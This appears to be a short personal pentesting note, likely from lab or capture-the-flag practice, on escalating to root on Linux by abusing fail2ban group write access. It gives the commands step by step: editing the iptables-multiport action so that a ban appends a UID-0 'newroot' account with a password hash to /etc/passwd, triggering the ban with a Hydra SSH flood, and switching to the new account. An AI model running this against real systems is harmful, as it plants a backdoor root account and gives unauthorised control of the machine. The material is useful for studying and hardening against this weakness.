Running `id` shows we are part of fail2ban group

![[Pasted image 20221110103107.png]]

Find the iptables-multiport.conf file:
```bash - target
find / -type f -iname iptables-multiport.conf 2> /dev/null
```

Verify that we have read / write privs:
```bash - kali
ls -lah /etc/fail2ban/action.d/iptables-multiport.conf
```

```bash - target
nano /etc/fail2ban/action.d/iptables-multiport.conf
```

[[17._passwd file]]

```bash - target
actionban = echo "newroot:L9yLGxncbOROc:0:0:root:/root:/bin/bash" >> /etc/passwd
```

![[Pasted image 20220403120429.png]]

Now force the bad by flooding ssh requests:
![[Hydra#Hydra against SSH]]

```bash - target
su newroot
```

```bash - target
password
```
